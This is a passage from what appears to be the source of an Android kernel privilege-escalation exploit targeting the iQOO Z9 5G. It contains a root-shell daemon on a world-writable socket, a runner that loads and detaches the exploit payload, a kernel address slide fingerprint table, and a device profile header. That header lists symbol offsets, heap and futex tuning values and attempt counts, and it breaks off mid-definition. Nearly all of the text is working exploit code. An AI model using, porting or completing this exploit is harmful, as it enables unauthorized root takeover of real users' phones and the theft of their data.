    if (pfd[1].revents & (POLLHUP | POLLERR | POLLNVAL)) {
      return 0;
    }
  }
}

static int run_interactive(struct su_request *request, int conn) {
  char slave_name[128];
  int master = open_pty_master(slave_name, sizeof(slave_name));
  if (master < 0) {
    close_request_fds(request);
    return 1;
  }

  pid_t pid = fork();
  if (pid < 0) {
    close(master);
    close_request_fds(request);
    return 1;
  }
  if (pid == 0) {
    setsid();
    int slave = open(slave_name, O_RDWR | O_NOCTTY);
    if (slave < 0) {
      _exit(126);
    }
    if (request->header.tty.has_termios) {
      tcsetattr(slave, TCSANOW, &request->header.tty.termios);
    }
    if (request->header.tty.has_winsize) {
      ioctl(slave, TIOCSWINSZ, &request->header.tty.winsize);
    }
    ioctl(slave, TIOCSCTTY, 0);
    if (dup2(slave, STDIN_FILENO) < 0 || dup2(slave, STDOUT_FILENO) < 0 ||
        dup2(slave, STDERR_FILENO) < 0 || !prepare_child(request)) {
      _exit(126);
    }
    if (slave > STDERR_FILENO) {
      close(slave);
    }
    close(master);
    close(conn);
    close_child_request_fds(request);
    execv(SH_PATH, request->argv);
    _exit(127);
  }

  int io_fd = request->io_fd;
  request->io_fd = -1;
  close_request_fds(request);
  int client_gone = pump_server_pty(io_fd, master);
  if (client_gone) {
    kill(pid, SIGHUP);
  }
  int status = wait_status(pid);
  close(master);
  close(io_fd);
  return status;
}

static int client_send_request(int conn, int argc, char **argv,
                               int interactive, int io_server_fd) {
  uint32_t envc = vector_count(environ, SU_MAX_ENVC);
  if ((uint32_t)argc > SU_MAX_ARGC || envc == UINT32_MAX) {
    return 0;
  }

  int cwd_fd = open(".", O_RDONLY | O_DIRECTORY | O_CLOEXEC);
  if (cwd_fd < 0) {
    return 0;
  }
  int fds[SU_PASSED_FDS] = {STDIN_FILENO, STDOUT_FILENO, STDERR_FILENO,
                            cwd_fd, io_server_fd};

  struct su_request_header header;
  memset(&header, 0, sizeof(header));
  header.magic = SU_PROTOCOL_MAGIC;
  header.version = SU_PROTOCOL_VERSION;
  header.argc = (uint32_t)argc;
  header.envc = envc;
  header.interactive = interactive != 0;
  if (interactive) {
    header.tty.has_termios =
        tcgetattr(STDIN_FILENO, &header.tty.termios) == 0;
    header.tty.has_winsize =
        ioctl(STDIN_FILENO, TIOCGWINSZ, &header.tty.winsize) == 0;
  }

  int ok = send_fds(conn, fds) &&
           write_full(conn, &header, sizeof(header)) &&
           send_vector(conn, argv, header.argc) &&
           send_vector(conn, environ, header.envc);
  close(cwd_fd);
  return ok;
}

static int client_main(int argc, char **argv) {
  int conn = connect_daemon();
  if (conn < 0) {
    return 127;
  }

  char auth;
  if (!read_full(conn, &auth, sizeof(auth))) {
    close(conn);
    return 1;
  }
  if (auth != 'A') {
    dprintf(STDERR_FILENO, "su: permission denied\n");
    close(conn);
    return 1;
  }

  int interactive = isatty(STDIN_FILENO);
  int io_pair[2];
  if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, io_pair) != 0) {
    close(conn);
    return 1;
  }
  if (!client_send_request(conn, argc, argv, interactive, io_pair[1])) {
    close(io_pair[0]);
    close(io_pair[1]);
    close(conn);
    return 1;
  }
  close(io_pair[1]);

  if (interactive) {
    if (tcgetattr(STDIN_FILENO, &saved_terminal) == 0) {
      struct termios raw = saved_terminal;
      cfmakeraw(&raw);
      if (tcsetattr(STDIN_FILENO, TCSANOW, &raw) == 0) {
        saved_terminal_fd = STDIN_FILENO;
        atexit(restore_terminal);
      }
    }
    pump_client_io(STDIN_FILENO, io_pair[0]);
    restore_terminal();
  }
  close(io_pair[0]);

  struct su_response response;
  if (!read_full(conn, &response, sizeof(response)) ||
      response.magic != SU_RESPONSE_MAGIC) {
    close(conn);
    return 1;
  }
  close(conn);
  return response.status;
}

static int get_peer_cred(int conn, struct ucred *peer) {
  socklen_t peer_len = sizeof(*peer);
  return getsockopt(conn, SOL_SOCKET, SO_PEERCRED, peer, &peer_len) == 0 &&
         peer_len == sizeof(*peer);
}

static void serve_one(int conn) {
  struct ucred peer;
  if (!get_peer_cred(conn, &peer) || peer.uid != allowed_client_uid) {
    char denied = 'D';
    write_full(conn, &denied, sizeof(denied));
    return;
  }
  char allowed = 'A';
  if (!write_full(conn, &allowed, sizeof(allowed))) {
    return;
  }

  char operation = 0;
  if (recv(conn, &operation, sizeof(operation), MSG_PEEK) ==
          (ssize_t)sizeof(operation) &&
      operation == 'H') {
    if (!read_full(conn, &operation, sizeof(operation))) {
      return;
    }
    hold_kernel_references(conn);
    return;
  }

  struct su_request request;
  if (!recv_request(conn, &request)) {
    free_request(&request);
    send_response(conn, 1);
    return;
  }

  int is_kernelsu_late_load = request.header.argc == 2 &&
                              strcmp(request.argv[1], "--late-load") == 0;
  int status = is_kernelsu_late_load
                   ? run_kernelsu_late_load(&request, conn)
                   : request.header.interactive
                         ? run_interactive(&request, conn)
                         : run_direct(&request, conn);
  send_response(conn, status);
  free_request(&request);
}

static int daemon_main(void) {
  signal(SIGPIPE, SIG_IGN);
  set_root_env();

  int fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (fd < 0) {
    return 1;
  }

  struct sockaddr_un sun;
  memset(&sun, 0, sizeof(sun));
  sun.sun_family = AF_UNIX;
  unlink(BOOTSTRAP_SOCK_PATH);
  snprintf(sun.sun_path, sizeof(sun.sun_path), "%s", BOOTSTRAP_SOCK_PATH);

  if (bind(fd, (struct sockaddr *)&sun, sizeof(sun)) != 0 ||
      listen(fd, 16) != 0) {
    close(fd);
    return 1;
  }
  chmod(BOOTSTRAP_SOCK_PATH, 0666);

  for (;;) {
    int conn = accept4(fd, NULL, NULL, SOCK_CLOEXEC);
    if (conn < 0 && errno == EINTR) {
      continue;
    }
    if (conn < 0) {
      sleep(1);
      continue;
    }

    pid_t pid = fork();
    if (pid == 0) {
      close(fd);
      serve_one(conn);
      close(conn);
      _exit(0);
    }
    close(conn);
    while (waitpid(-1, NULL, WNOHANG) > 0) {
    }
  }
}

static int umh_main(int argc, char **argv) {
  if (geteuid() != 0) {
    return 126;
  }
  if (argc != 3) {
    return 124;
  }
  char *end = NULL;
  errno = 0;
  unsigned long parsed_uid = strtoul(argv[2], &end, 10);
  if (errno || end == argv[2] || *end || parsed_uid == 0 ||
      parsed_uid > UINT32_MAX) {
    return 123;
  }
  allowed_client_uid = (uid_t)parsed_uid;
  if (setresgid(0, 0, 0) != 0 || setresuid(0, 0, 0) != 0 ||
      getuid() != 0 || geteuid() != 0 || getgid() != 0 || getegid() != 0) {
    return 125;
  }
  return daemon_main();
}

static void relay_payload_log_tail(const char *path, int transport_fd) {
  const off_t tail_size = 64 * 1024;
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    dprintf(transport_fd, "[runner-tail] open failed errno=%d\n", errno);
    return;
  }
  struct stat st;
  if (fstat(fd, &st) != 0) {
    dprintf(transport_fd, "[runner-tail] stat failed errno=%d\n", errno);
    close(fd);
    return;
  }
  off_t start = st.st_size > tail_size ? st.st_size - tail_size : 0;
  if (lseek(fd, start, SEEK_SET) < 0) {
    dprintf(transport_fd, "[runner-tail] seek failed errno=%d\n", errno);
    close(fd);
    return;
  }
  dprintf(transport_fd, "[runner-tail] path=%s bytes=%lld start=%lld\n",
          path, (long long)st.st_size, (long long)start);
  char buffer[4096];
  for (;;) {
    ssize_t got = read(fd, buffer, sizeof(buffer));
    if (got < 0 && errno == EINTR) {
      continue;
    }
    if (got <= 0 || !write_full(transport_fd, buffer, (size_t)got)) {
      break;
    }
  }
  close(fd);
}

static pid_t follow_payload_log(const char *path, int transport_fd,
                                pid_t payload_pid, int *status) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  int transport_ok = 1;
  if (fd < 0) {
    dprintf(transport_fd, "[runner-live] open failed errno=%d\n", errno);
    pid_t waited;
    do {
      waited = waitpid(payload_pid, status, 0);
    } while (waited < 0 && errno == EINTR);
    return waited;
  }

  if (dprintf(transport_fd, "[runner-live] following path=%s interval_ms=100\n",
              path) < 0) {
    transport_ok = 0;
  }

  char buffer[4096];
  for (;;) {
    for (;;) {
      ssize_t got = read(fd, buffer, sizeof(buffer));
      if (got < 0 && errno == EINTR) {
        continue;
      }
      if (got < 0) {
        if (transport_ok) {
          dprintf(transport_fd, "[runner-live] read failed errno=%d\n", errno);
        }
        close(fd);
        pid_t waited;
        do {
          waited = waitpid(payload_pid, status, 0);
        } while (waited < 0 && errno == EINTR);
        return waited;
      }
      if (got == 0) {
        break;
      }
      if (transport_ok &&
          !write_full(transport_fd, buffer, (size_t)got)) {
        transport_ok = 0;
      }
    }

    pid_t waited = waitpid(payload_pid, status, WNOHANG);
    if (waited == payload_pid) {
      /* The writer has exited. Drain bytes appended between the last EOF and
       * waitpid before returning the final status to the adb shell. */
      for (;;) {
        ssize_t got = read(fd, buffer, sizeof(buffer));
        if (got < 0 && errno == EINTR) {
          continue;
        }
        if (got <= 0) {
          break;
        }
        if (transport_ok &&
            !write_full(transport_fd, buffer, (size_t)got)) {
          transport_ok = 0;
        }
      }
      if (transport_ok) {
        dprintf(transport_fd, "[runner-live] child=%d complete status=0x%x\n",
                payload_pid, *status);
      }
      close(fd);
      return waited;
    }
    if (waited < 0) {
      close(fd);
      return waited;
    }
    usleep(100000);
  }
}

static int payload_runner_main(int argc, char **argv) {
  if (argc != 5) {
    return 2;
  }

  int transport_fd = fcntl(STDOUT_FILENO, F_DUPFD_CLOEXEC, 3);
  if (transport_fd < 0) {
    return errno;
  }

  int log_fd = open(argv[4], O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (log_fd < 0 || dup2(log_fd, STDOUT_FILENO) < 0 ||
      dup2(log_fd, STDERR_FILENO) < 0) {
    int saved_errno = errno ? errno : EIO;
    dprintf(transport_fd, "[runner-tail] log setup failed errno=%d\n",
            saved_errno);
    close(transport_fd);
    return saved_errno;
  }
  if (log_fd > STDERR_FILENO) {
    close(log_fd);
  }
  if (setvbuf(stdout, NULL, _IONBF, 0) != 0 ||
      setvbuf(stderr, NULL, _IONBF, 0) != 0) {
    return errno ? errno : EIO;
  }

  /*
   * RDB can drop while the allocator search is still running.  Keep a
   * waitable foreground supervisor for normal adb behavior, but execute the
   * payload in a new session so loss of the shell cannot kill the only run on
   * this boot.  The child owns the persistent log and remains observable by
   * the same helper process when the transport stays alive.
   */
  signal(SIGHUP, SIG_IGN);
  pid_t payload_pid = fork();
  if (payload_pid < 0) {
    close(transport_fd);
    return errno;
  }
  if (payload_pid > 0) {
    int status = 0;
    pid_t waited = follow_payload_log(argv[4], transport_fd, payload_pid,
                                      &status);
    if (waited < 0) {
      int saved_errno = errno;
      relay_payload_log_tail(argv[4], transport_fd);
      close(transport_fd);
      return saved_errno;
    }
    close(transport_fd);
    if (WIFEXITED(status)) {
      return WEXITSTATUS(status);
    }
    if (WIFSIGNALED(status)) {
      return 128 + WTERMSIG(status);
    }
    return ECHILD;
  }

  close(transport_fd);
  signal(SIGHUP, SIG_IGN);
  if (prctl(PR_SET_PDEATHSIG, 0) != 0 || setsid() < 0) {
    return errno ? errno : EPERM;
  }
  prctl(PR_SET_NAME, "cve43499-run", 0, 0, 0);

  char root_helper_path[PATH_MAX];
  if (!realpath(argv[3], root_helper_path)) {
    dprintf(STDERR_FILENO,
            "[app] root helper realpath failed path=%s errno=%d\n", argv[3],
            errno);
    return errno ? errno : ENOENT;
  }
  if (setenv("CVE43499_ROOT_HELPER", root_helper_path, 1) != 0) {
    return errno;
  }
  dprintf(STDERR_FILENO, "[app] root helper=%s\n", root_helper_path);
  dprintf(STDERR_FILENO, "[app] loading verified payload=%s\n", argv[2]);
  void *handle = dlopen(argv[2], RTLD_NOW | RTLD_LOCAL);
  if (!handle) {
    dprintf(STDERR_FILENO, "[app] dlopen failed: %s\n", dlerror());
    return ENOEXEC;
  }
  dprintf(STDERR_FILENO, "[app] payload constructor returned\n");
  fflush(NULL);
  fsync(STDOUT_FILENO);
  return 0;
}

int main(int argc, char **argv) {
  signal(SIGPIPE, SIG_IGN);
  if (argc >= 2 && strcmp(argv[1], "--run-payload") == 0) {
    return payload_runner_main(argc, argv);
  }
  if (argc >= 2 && strcmp(argv[1], "--daemon") == 0) {
    return daemon_main();
  }
  if (argc >= 2 && strcmp(argv[1], "--umh") == 0) {
    return umh_main(argc, argv);
  }
  return client_main(argc, argv);
}

```

---

## targets/iqoo-z9-5g/p0_fingerprint.h

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/targets/iqoo-z9-5g/p0_fingerprint.h`

```c
// Generated from the exact raw Image.
// Each row maps actual slide to Image[0x1f0000 - slide].
#ifndef P0_FINGERPRINT_H
#define P0_FINGERPRINT_H

#define P0_FINGERPRINT_WORDS 8

static const uint16_t p0_fingerprint_offsets[P0_FINGERPRINT_WORDS] = {
  0x000, 0x200, 0x400, 0x600, 0x800, 0xa00, 0xc00, 0xe00,
};

struct p0_fingerprint {
  uintptr_t slide;
  uint64_t words[P0_FINGERPRINT_WORDS];
};

static const struct p0_fingerprint p0_fingerprints[] = {
  { 0x000000ULL, { 0x1100050888dffd08ULL, 0x910003e5350004c1ULL,
    0xaa001908f2b016a9ULL, 0x927d654ad343fd2aULL,
    0xd50323bf9100c3ffULL, 0xd65f03c0d50323bfULL,
    0xd503249f17ffffe0ULL, 0xf9000a9694203332ULL } },
  { 0x010000ULL, { 0x54fffbe09b087d69ULL, 0xd503201f35000089ULL,
    0xaa1603e034fff2c1ULL, 0x396d8261396d8668ULL,
    0x88e87e622a0103e8ULL, 0xa9445ff8a94557f6ULL,
    0x1400006814000069ULL, 0x9400a85eaa1703e0ULL } },
  { 0x020000ULL, { 0x9100054a9a938129ULL, 0xeb1c010852800037ULL,
    0x9000eb0017ffff7dULL, 0x9a8ab129eb0a013fULL,
    0x54000080b9001268ULL, 0xaa0903f4d65f03c0ULL,
    0xb40002f3b4000180ULL, 0xd50323bff900d008ULL } },
  { 0x030000ULL, { 0xaa1503e054000381ULL, 0xd503201f370806c8ULL,
    0xd503233ff8bfc108ULL, 0xd503201f34000049ULL,
    0xb9407909f9455268ULL, 0xf1000508c8dffee8ULL,
    0x9000ef2017fffff0ULL, 0xd10143ffd503233fULL } },
  { 0x040000ULL, { 0xf940010836200069ULL, 0x2a1f03e034000148ULL,
    0xd50323bff85f8e5eULL, 0xf8bfc2f8f8bfc2e8ULL,
    0xf800865ed10283ffULL, 0xea0b011f1a8a054aULL,
    0xf9400108d1010340ULL, 0xf0015038f2701d3fULL } },
  { 0x050000ULL, { 0x35ffff8b880b7d49ULL, 0xf942f108910023eaULL,
    0xf8bfc109d5184618ULL, 0xd51b4236910042e8ULL,
    0x910003fda9bf7bfdULL, 0x910003fda9015ff8ULL,
    0x3700042839415268ULL, 0xf9400514a90003f4ULL } },
  { 0x060000ULL, { 0xf9400fa89409aacbULL, 0xf85882c92a1f03e8ULL,
    0xaa1703f5d5384116ULL, 0x1400001d9400023aULL,
    0x54000940f101011fULL, 0x2a1f03e8f000e935ULL,
    0xaa1f03e114000071ULL, 0x52801409d503249fULL } },
  { 0x070000ULL, { 0x35ffffaac80a7e69ULL, 0x17ffffd3f9400fa8ULL,
    0xc8dffd0991004288ULL, 0xf942f108d5384108ULL,
    0x880b7d0a3500006bULL, 0x9119810890016288ULL,
    0x88dffd499100426aULL, 0x2a1f03e897ffd21eULL } },
  { 0x080000ULL, { 0x711c153fb9400929ULL, 0xf26c011f52800102ULL,
    0xf943fe692a1f03e8ULL, 0xf95f690df95f650cULL,
    0x34fffe409400430bULL, 0x12800080aa0003f5ULL,
    0xd5184609521b0909ULL, 0x910103fff85f8e5eULL } },
  { 0x090000ULL, { 0x540001a0eb09011fULL, 0xb9001269f1000529ULL,
    0xb0016388b9001268ULL, 0xd119a16ac8dffd2bULL,
    0x17ffffe594004b8eULL, 0x9100436837f80848ULL,
    0x17ffff9535ffffa9ULL, 0xf9401004b9401803ULL } },
  { 0x0a0000ULL, { 0xf9002a88f9002688ULL, 0xf90003e9f80e8d28ULL,
    0x91017368361800c8ULL, 0xd00168a090015aa8ULL,
    0x5280002252800021ULL, 0x910b740052800029ULL,
    0x4b0803e852800028ULL, 0xf140095f9aca216aULL } },
  { 0x0b0000ULL, { 0x54fff3e3eb0102dfULL, 0xa9474ff42a1f03e0ULL,
    0xf94008b4aa0303f3ULL, 0xf2bbe380900155c2ULL,
    0xd503201f14000070ULL, 0xd50c8328d5033b9fULL,
    0xf9400075a9034ff4ULL, 0xa9057fe8f90027e5ULL } },
  { 0x0c0000ULL, { 0xd538460bd5184608ULL, 0xd518202db340bd8dULL,
    0x5284650db360fdabULL, 0x7200111f54000061ULL,
    0x8b284e6854000561ULL, 0xd503249f17fffff4ULL,
    0xaa0003f3d5384108ULL, 0xa9417bfda9434ff4ULL } },
  { 0x0d0000ULL, { 0xf94efe7937f80949ULL, 0xd5184615f8bfc108ULL,
    0x52800022aa0803e0ULL, 0x880b7d0a3500006bULL,
    0x3940018c54fffdc0ULL, 0xf8bfc168f8bfc108ULL,
    0x910042c8d51b4235ULL, 0xf900327f35000981ULL } },
  { 0x0e0000ULL, { 0x71003d3f51340109ULL, 0xf800865ed503233fULL,
    0xcb0802c8a9402408ULL, 0xf140073991040273ULL,
    0xd503201ff9042808ULL, 0x72bffce8912a626cULL,
    0xaa1303e1c8dffee8ULL, 0xd538411536000388ULL } },
  { 0x0f0000ULL, { 0x8b090108f9425ac9ULL, 0xd538410814000046ULL,
    0x1400001414000015ULL, 0xaa1f03ea14000003ULL,
    0x110c812ed37df16cULL, 0x8b080128aa1703e5ULL,
    0x910043fda9017bfdULL, 0x14000041b4000788ULL } },
  { 0x100000ULL, { 0x88dffd0a91004128ULL, 0x9acc214c54000168ULL,
    0x94058079a9007fffULL, 0x2a1f03e1aa0803e0ULL,
    0xaa0103f3910003fdULL, 0xb40000e8d374fc08ULL,
    0xaa1f03e5390000bfULL, 0xdac01129dac00129ULL } },
  { 0x110000ULL, { 0xaa1f03e3aa1f03e2ULL, 0xd0016a6b54fffe00ULL,
    0xa94083e8940c69cbULL, 0xb4000108c8dffd08ULL,
    0xd65f03c0d50323bfULL, 0xd5384108a9094ff4ULL,
    0x8b1801281a8a0555ULL, 0x35ffff88385f8348ULL } },
  { 0x120000ULL, { 0x2a0003f794002a36ULL, 0xd0015908910003fdULL,
    0x9279cd29d345fd29ULL, 0xaa1303e1aa1603e0ULL,
    0xf94007e8d503249fULL, 0xf9400108d0016fc8ULL,
    0x531d7d09d50323bfULL, 0xf000ef6114000009ULL } },
  { 0x130000ULL, { 0x540000a06b08013fULL, 0x17ffffa635ffffaaULL,
    0x9280000014000002ULL, 0x1a8a01217101615fULL,
    0x940df2122a0803e0ULL, 0xd518200cd140056cULL,
    0xd51b4229d5033fdfULL, 0x3940f8299100d26bULL } },
  { 0x140000ULL, { 0xd5184609f8bfc16bULL, 0x9240bd4ad538202aULL,
    0x9100126ad503249fULL, 0x5280140ad503249fULL,
    0x14000113b800092bULL, 0xd50343df52800c0aULL,
    0x910143fff85f8e5eULL, 0xd5184608d5184609ULL } },
  { 0x150000ULL, { 0xb8bfc2c8b8bfc2cbULL, 0x910023e994275350ULL,
    0xf94163499426f716ULL, 0x54000122f100213fULL,
    0xf9000bf5a9bd7bfdULL, 0x91004288d5384114ULL,
    0xd000b4f8540003c0ULL, 0x7940314d7940354cULL } },
  { 0x160000ULL, { 0x14003dd9913c2108ULL, 0xf000b68814003d54ULL,
    0xd000b60814003cd4ULL, 0x14003c53911f0108ULL,
    0xb000b66814003bd4ULL, 0x14003af4912b2108ULL,
    0xf000b5c814003ad4ULL, 0x14003868910f8108ULL } },
  { 0x170000ULL, { 0xf2f00fc8f2d16028ULL, 0x540ee941eb08001fULL,
    0xeb08001ff2e0ebe8ULL, 0xf2c9e888f2b2cc88ULL,
    0x9000b7a8540eb961ULL, 0x540e72c0eb08001fULL,
    0x91286108f000b708ULL, 0xd28b9628540e5940ULL } },
  { 0x180000ULL, { 0xf2f688a8f2c48448ULL, 0x5416e941eb08001fULL,
    0x9134c108d000b7c8ULL, 0xd2889c881400bc54ULL,
    0xf2c82028f2b7cc88ULL, 0xeb08001ff2ea8288ULL,
    0xd29569e8541447e0ULL, 0xf2d48f28f2aec1a8ULL } },
  { 0x190000ULL, { 0x5413772deb08001fULL, 0x9130c108f000b7c8ULL,
    0xd289e448541a48c0ULL, 0x541a3c00eb08001fULL,
    0xeb08001ff2eaf5a8ULL, 0xf000b788541ea961ULL,
    0x541a16e0eb08001fULL, 0xeb08001ff2e3d2c8ULL } },
  { 0x1a0000ULL, { 0x14013db59115e108ULL, 0xf2ff98a8f2d88dc8ULL,
    0xf2c76648f2b02808ULL, 0xf2a08328d288ff48ULL,
    0xf2f5fea8f2d04888ULL, 0xf2d3fd68f2b6a008ULL,
    0xf2aab1e8d2872588ULL, 0xd28f2c2814013a54ULL } },
  { 0x1b0000ULL, { 0xf2d91328f2a0acc8ULL, 0xeb08001ff2f4cb48ULL,
    0xd28a5cc85426e220ULL, 0xf2ca4ac8f2b2d828ULL,
    0xeb08001ff2f1d428ULL, 0xf2d634a8f2bed8a8ULL,
    0x913ca108d000ba28ULL, 0xf2ebe848f2deebc8ULL } },
  { 0x1c0000ULL, { 0x542da6a0eb08001fULL, 0xf2bc52c8d29f75c8ULL,
    0xd28ff2c854106e8dULL, 0x542d7dc0eb08001fULL,
    0xeb08001ff2fa6468ULL, 0xd2945f285408ef2cULL,
    0x541d0b4ceb08001fULL, 0xeb08001ff2f58528ULL } },
  { 0x1d0000ULL, { 0xb5ffff229ac64c00ULL, 0xd9600024b4000122ULL,
    0xf84008275400012bULL, 0xa9474430a8374410ULL,
    0xf80088cef80008cdULL, 0xf100805f54000788ULL,
    0xa93c34aca9402c2aULL, 0xca010007d503245fULL } },
  { 0x1e0000ULL, { 0xf800865ed503233fULL, 0xd5033fdfd0015e68ULL,
    0x0000000000000000ULL, 0x0000000000000000ULL,
    0x8b2063ffd10543ffULL, 0x8b2063ffd10543ffULL,
    0xd53bd07e14000003ULL, 0xaa1f03fe14000002ULL } },
  { 0x1f0000ULL, { 0x14a53ffffa405a4dULL, 0xd503201fd503201fULL,
    0xd503201fd503201fULL, 0xd503201fd503201fULL,
    0xd503201fd503201fULL, 0xd503201fd503201fULL,
    0xd503201fd503201fULL, 0xd503201fd503201fULL } },
};

#endif

```

---

## targets/iqoo-z9-5g/target.h

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/targets/iqoo-z9-5g/target.h`

```c
#ifndef OFFSET_H
#define OFFSET_H

// iQOO Z9 5G (MediaTek Dimensity 7200 / mt6886) port.
// Kernel: 5.15.178-android13-8-g0ebe6a5da65d, raw ARM64 Image in tools/kernel.
//
// Everything below was derived offline from the raw kernel Image:
//   - BTF blob (struct layouts)          -> tools/extract_btf.py
//   - embedded kallsyms table (symbols)  -> tools/extract_kallsyms.py
//   - capstone disassembly (caller offsets, kmalloc_slab type indices,
//     __get_wchan unwind ranges)
//
// Same android13-8 5.15 family as the hardware-verified dm2q/dm3q profiles,
// so the struct layouts and tuning values carry over; only the symbol
// offsets and the physical placement differ (MTK vs Qualcomm).
//
// NOT YET VERIFIED ON DEVICE:
//   P0_PHYS_OFFSET 0x40000000 / P0_KERNEL_PHYS_LOAD 0x44000000 are the
//   standard MediaTek values (DRAM base 0x40000000, lk kernel load 0x44000000).
//   Confirm before/after the first run:
//     adb shell "cat /proc/iomem | head -40"   -> "System RAM" and "Kernel code"
//     adb shell cat /sys/kernel/tracing/events/sched/sched_blocked_reason/id
//       (expect 108 = __TRACE_LAST_TYPE(20) + event index 88)
//
// Known device deltas vs the dm2q/dm3q Samsung profiles:
//   - no copy_splice_read symbol; COPY_SPLICE_READ = generic_file_splice_read
//   - configfs symbols are the plain 5.15 names (configfs_read_iter etc.)
//   - kmalloc_slab disasm: type = RECLAIMABLE ? 2 : 1 -> CGROUP=1, RECLAIM=2
//   - wait_for_vfork_done blocks via do_wait_for_common; __get_wchan unwinds
//     past the whole __sched_text chain (17-frame loop), so the vfork caller
//     is the return address in wait_for_vfork_done itself.

#ifndef MM_STRUCT_SZ
#define MM_STRUCT_SZ 0x400
#endif

#define KMALLOC_CGROUP_TYPE 1
#define KMALLOC_CACHE_TYPES 3

#define MM_ORDER 3
#define KSNITCH_COLLISIONS 4
#define KERNELSNITCH_VERBOSE 0
#define KERNELSNITCH_MTE_ENABLED 0
#define KERNELSNITCH_THRESHOLD_MULT 10
#define FAKE_WAITER_PRIO 130
#define PSELECT_ENTER_DELAY_USEC 50000

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define SLIDE_MCAST_DOMAIN AF_INET6
#define SLIDE_MCAST_LEVEL IPPROTO_IPV6
#define SLIDE_MCAST_OPTION MCAST_JOIN_SOURCE_GROUP
#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 2
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 2
#define BUILD_VARIANT_LABEL "iqoo-z9-5g-tracefs-shaped-configfs-pipe-root"
#define APP_PHYS_P0_ORACLE 1
#define APP_TRACEFS_SLIDE 1
#define APP_CLOSED_FOPS_ROUTE 1
#define APP_CONTROLLED_MM_GROUP_RECLAIM 1
#define APP_FOPS_ROUTE_COARSE_DELAY_USEC 50000
#define APP_FOPS_ROUTE_FINE_DELAY_TICKS \
  0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL
#define APP_FOPS_BEFORE_PIPE 1
#define APP_EXACT_PIPE_BUFFER_ONLY 1
#define APP_PRODUCTION_STACK_PI_RIGHT_ONLY 1
#define APP_ROOT_REF_HOLDER_REQUIRED 0
#define DEFAULT_EXPLOIT_ATTEMPTS 8
#else
#define BUILD_VARIANT_LABEL "iqoo-z9-5g-root-umh"
#endif

#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "vivo/I2304/I2304:14/UP1A.231005.007/compiler.02180000:user/release-keys"
#endif

#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#ifndef P0_PHYS_OFFSET
#define P0_PHYS_OFFSET 0x40000000ULL
#endif
#ifndef P0_KERNEL_PHYS_LOAD
#define P0_KERNEL_PHYS_LOAD 0x44000000ULL
#endif

#define SKB_DATA_DELTA (-0xe80LL)
#define SKB_SEND_SIZE 0x8e80
#define SKB_RECLAIM_SENDS 64
#define APP_SLIDE_RECLAIM_SENDS 64
#define PIPE_MAX_ATTEMPTS 12

#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_WAITER_WAKE_STATE 0
#define SLIDE_LOCK_OWNER_VALUE 0ULL
#define SLIDE_WAIT_NSEC 2000000000L
// Give the timeout/requeue PI state enough time to settle before the
// EDEADLK probe.  The 50 ms setting still occasionally leaves the chain in
// the transient state that later makes sched_setattr follow a waiter with a
// NULL lock; 100 ms was stable on the reference runs.
#define SLIDE_REQUEUE_ARM_USEC 100000
#define SLIDE_USE_FAKE_TASK 1
#define LEGACY_RT_MUTEX_WAITER 0
#define COMPACT_RT_MUTEX_WAITER 1
#define SLIDE_RB_PARENT_TYPE_RESTORE 1ULL
#define SLIDE_TRACEFS_EVENT_ID 108
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00194758ULL
#define SLIDE_TRACEFS_VFORK_CALLER_OFF 0x0014d098ULL
// This kernel runs PAC-ret (paciasp/autiasp on every function). Saved PCs
// carry APIAKey PAC bits in [54:48], and the __get_wchan unwind loop's
// __sched_text range compares misdetect PAC'd frames depending on the
// per-boot key. Accept the schedule-internal return address (0x178e52c,
// the instruction after `bl __schedule` in schedule) as a second anchor.
#define SLIDE_TRACEFS_STRIP_PAC 1
#define SLIDE_TRACEFS_SCHED_CALLER_OFF 0x00178e52cULL
// The matching GKI source uses strncpy_from_user()/strscpy() for SET_NAME.
// Reconstruct embedded NULs with descending prefix writes; a verbatim blob
// would truncate at the first NUL and leave the write-only fields unset.
#define ASHMEM_RAW_NAME_BLOB 0
#define ASHMEM_READ_DIAGNOSTICS 1
// This kernel is RELR-relocated: MTK lk loads it at an ARBITRARY 64K-
// aligned virtual base in the kernel VA window (observed
// 0xffffffda1bc00000, i.e. "slide" 0x1a13b80000). The tracefs parse
// computes base = caller - anchor_offset directly and validates it
// against this window; the cap must cover the whole kernel VA range.
#define SLIDE_TRACEFS_MAX_CANDIDATE 0x20000000000ULL
#define SLIDE_MAX_OFFSET 0x20000000000ULL
#define SLIDE_P0_OFFSET_CANDIDATES \
  0x000000ULL, 0x010000ULL, 0x020000ULL, 0x030000ULL, \
  0x040000ULL, 0x050000ULL, 0x060000ULL, 0x070000ULL, \
  0x080000ULL, 0x090000ULL, 0x0a0000ULL, 0x0b0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0e0000ULL, 0x0f0000ULL, \
  0x100000ULL, 0x110000ULL, 0x120000ULL, 0x130000ULL, \
  0x140000ULL, 0x150000ULL, 0x160000ULL, 0x170000ULL, \
  0x180000ULL, 0x190000ULL, 0x1a0000ULL, 0x1b0000ULL, \
  0x1c0000ULL, 0x1d0000ULL, 0x1e0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS 8
#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define SLIDE_BANK_SLOTS 4
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
